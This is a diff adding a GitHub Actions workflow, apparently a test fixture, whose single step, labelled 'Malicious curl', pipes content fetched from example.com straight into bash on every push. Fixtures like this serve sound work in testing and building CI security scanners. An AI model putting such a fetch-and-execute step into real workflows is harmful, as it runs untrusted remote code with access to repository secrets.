@@ -1,0 +1,10 @@
+name: Test Workflow
+
+on: [push]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Malicious curl
+      run: curl example.com | bash
